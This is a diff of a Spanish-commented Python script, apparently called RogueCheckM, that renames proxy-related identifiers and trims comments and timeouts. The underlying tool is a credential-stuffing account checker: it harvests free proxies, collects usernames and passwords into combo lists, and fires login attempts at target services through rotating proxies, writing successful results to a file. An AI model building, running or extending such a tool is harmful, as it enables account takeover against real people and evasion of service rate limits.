@@ -12,9 +12,9 @@ import time
 import json
 
 # Constantes
-MAX_RETRIES = 5  # Máximo de intentos de reintentar obtener contraseñas con un proxy
+MAX_RETRIES = 3  # Máximo de intentos de reintentar obtener contraseñas con un proxy
 REQUEST_TIMEOUT = 1  # Tiempo máximo de espera para solicitudes en segundos
-REQUEST_TIMEOUT_CHECK_PROXY = 5
+REQUEST_TIMEOUT_CHECK_PROXY = 2
 DATABASE_PATH = None
 NEW_URL = False
 DOMAIN_URL = None
@@ -139,60 +139,54 @@ def generate_combos(conn):
         print(f"Error al generar combos: {e}")
 
 def parse_arguments():
-    parser = argparse.ArgumentParser(description="RogueCheckM - Herramienta de verificación de cuentas con generación de combos y proxies")
+    parser = argparse.ArgumentParser(description="Tu descripción del script")
 
-    parser.add_argument("--url", "-u", dest="new_url", metavar="NEW_URL", type=str, help="Establece una nueva URL de destino para las solicitudes HTTP")
-    parser.add_argument("--site", "-s", dest="service", metavar="SERVICE", type=str, help="Establece el servicio objetivo para las solicitudes HTTP")
+    parser.add_argument("--url", "-u", dest="new_url", metavar="NEW_URL", type=str, help="Establecer una nueva URL")
+    parser.add_argument("--site", "-s", dest="service", metavar="SERVICE", type=str, help="Establecer el servicio objetivo")
 
     return parser.parse_args()
 
-def get_proxys():
+def get_proxies():
     proxy_urls = config["proxy_sources"]
-    proxys = []
+    proxies = []
     try:
         for url in proxy_urls:
             try:
                 response = requests.get(url, timeout=REQUEST_TIMEOUT)
-                proxys.extend(response.text.split('\r\n'))
+                proxies.extend(response.text.split('\r\n'))
             except Exception as e:
                 pass
     except KeyboardInterrupt:
         time.sleep(2)
         print("Ctrl+C presionado. Cancelando la ejecución...")
-    return proxys
+    return proxies
 
-from concurrent.futures import ThreadPoolExecutor
-from tqdm import tqdm
-
-def working_proxys():
+def working_proxies():
     try:
-        print('Searching and Checking proxys...')
+        print('Searching and Checking proxies...')
         with ThreadPoolExecutor() as executor:
-            proxys = list(tqdm(executor.map(lambda x: check_proxy(x), get_proxys()), total=len(get_proxys()), desc="Searching and Checking proxys", unit=" proxys"))
+            proxies = list(tqdm(executor.map(lambda x: check_proxy(x), get_proxies()), total=len(get_proxies()), desc="Searching and Checking proxies", unit=" proxies"))
 
-        working_proxys_list = [proxy for proxy in proxys if proxy is not None]
-        print(f'Found {len(working_proxys_list)} working proxys.')
+        working_proxies_list = [proxy for proxy in proxies if proxy is not None]
+        print(f'Found {len(working_proxies_list)} working proxies.')
 
-        if not working_proxys_list:
-            print("CANCELED ACCOUNT CHECKING DUE TO LACK OF proxys")
+        if not working_proxies_list:
+            print("CANCELED ACCOUNT CHECKING DUE TO LACK OF proxies")
             sys.exit(0)
 
-        return working_proxys_list
+        return working_proxies_list
     except Exception as e:
-        print(f"An error occurred in 'working_proxys': {e}")
+        print(f"An error occurred in 'working_proxies': {e}")
         return []
-
-
 
 def send_http_requests(conn, combos_len, domain_url, service_name):
     try:
         with ThreadPoolExecutor() as executor:
             combos = [(record[0], record[1]) for record in conn.execute("SELECT username, password FROM Combos").fetchall()]
-            working_proxys_list = working_proxys()  # Get the list of working proxies here
+            working_proxies_list = working_proxies()
             
-            results = list(executor.map(lambda x: request_web_combos(combos_chunk=x, proxys=working_proxys_list, domain_url=domain_url, service_name=service_name), [combos[i:i + 100] for i in range(0, len(combos), 100)]))
+            results = list(executor.map(lambda x: request_web_combos(combos_chunk=x, proxies=working_proxies_list, domain_url=domain_url, service_name=service_name), [combos[i:i + 100] for i in range(0, len(combos), 100)]))
 
-        # Save the results in the results.txt file
         with open('results.txt', 'w') as results_file:
             for result_set in results:
                 for result in result_set:
@@ -201,7 +195,7 @@ def send_http_requests(conn, combos_len, domain_url, service_name):
     except Exception as e:
         print(f"Error al enviar solicitudes HTTP: {e}")
 
-def request_web_combos(combos_chunk, proxys, domain_url, service_name):
+def request_web_combos(combos_chunk, proxies, domain_url, service_name):
     """Envía solicitudes HTTP para combos de usernames y passwords."""
     try:
         results = []
@@ -210,7 +204,7 @@ def request_web_combos(combos_chunk, proxys, domain_url, service_name):
         for combo in tqdm(combos_chunk, desc=description, unit="combo_proxy"):
             username, password = combo
             url = f'https://{domain_url}?username={username}&password={password}'
-            proxy = random.choice(proxys) if proxys else None
+            proxy = random.choice(proxies) if proxies else None
             try:
                 response = requests.get(url, proxies={'http': proxy, 'https': proxy} if proxy else None, timeout=REQUEST_TIMEOUT)
                 response.raise_for_status()
@@ -224,12 +218,6 @@ def request_web_combos(combos_chunk, proxys, domain_url, service_name):
         return []
 
 def main():
-    # if "--url" in sys.argv or "-u" in sys.argv:
-    #     NEW_URL = True 
-    #     index = sys.argv.index("--url") if "--url" in sys.argv else sys.argv.index("-u")
-    #     global DOMAIN_URL
-    #     DOMAIN_URL = sys.argv[index + 1]
-
     signal.signal(signal.SIGINT, signal_handler)
     args = parse_arguments()
     try:
@@ -243,31 +231,27 @@ def main():
         with sqlite3.connect(DATABASE_PATH) as conn:
             create_tables(conn, config)
 
-            # print('Searching and Checking proxys...')
             with ThreadPoolExecutor() as executor:
-                proxys = list(tqdm(executor.map(lambda x: check_proxy(x), get_proxys()), total=len(get_proxys()), desc="Searching and Checking proxys", unit=" proxys"))
-            working_proxys = [proxy for proxy in proxys if proxy is not None]
-            print(f'Found {len(working_proxys)} working proxys.')
+                proxies = list(tqdm(executor.map(lambda x: check_proxy(x), get_proxies()), total=len(get_proxies()), desc="Searching and Checking proxies", unit=" proxies"))
             
-            if not working_proxys:
-                print("CANCELED ACCOUNT CHECKING DUE TO LACK OF proxys")
+            working_proxies_list = [proxy for proxy in proxies if proxy is not None]
+            print(f'Found {len(working_proxies_list)} working proxies.')
+            
+            if not working_proxies_list:
+                print("CANCELED ACCOUNT CHECKING DUE TO LACK OF proxies")
                 return
 
-            # print('Searching for Usernames and Passwords...')
             with ThreadPoolExecutor() as executor:
-                usernames = list(tqdm(executor.map(lambda x: get_usernames(x), working_proxys), total=len(working_proxys), desc="Searching Usernames and Passwords", unit=" combos_proxy"))
+                usernames = list(tqdm(executor.map(lambda x: get_usernames(x), working_proxies_list), total=len(working_proxies_list), desc="Searching Usernames and Passwords", unit=" combos_proxy"))
 
-            # print('Checking Valid Formats...')
             with ThreadPoolExecutor() as executor:
-                passwords = list(tqdm(executor.map(lambda x: get_passwords(x), working_proxys), total=len(working_proxys), desc="Checking Valid Formats"))
+                passwords = list(tqdm(executor.map(lambda x: get_passwords(x), working_proxies_list), total=len(working_proxies_list), desc="Checking Valid Formats"))
 
             generate_combos(conn)  # Generar combos antes de enviar solicitudes HTTP
 
-            combos_len = min(len(usernames),len(passwords))  # Número arbitrario de combos a enviar
+            combos_len = min(len(usernames), len(passwords))
             print(f'Obtained {combos_len} usernames and passwords.')
 
-            # Selector de Domain URL
-            global DOMAIN_URL,SERVICE_NAME
             if args.new_url:
                 DOMAIN_URL = args.new_url
             elif "domain_default" in config["urls"]:
@@ -277,7 +261,6 @@ def main():
 
             print(f'Target Domain: {DOMAIN_URL}')
 
-            # Selector de Servicio
             if args.service:
                 SERVICE_NAME = args.service
             else:
@@ -286,16 +269,13 @@ def main():
                 answers = inquirer.prompt(questions)
                 SERVICE_NAME = answers["service"]
                 DOMAIN_URL = target_domains[SERVICE_NAME]
-                
 
             print(f'Target Service: {SERVICE_NAME}')
 
-            # Realizar solicitudes HTTP
             send_http_requests(conn=conn, combos_len=combos_len, domain_url=DOMAIN_URL, service_name=SERVICE_NAME)
 
-    except Exception as e:
+    except requests.RequestException as e:
          print(f"Error inesperado: {e}")
-        
 
 if __name__ == "__main__":
     main()
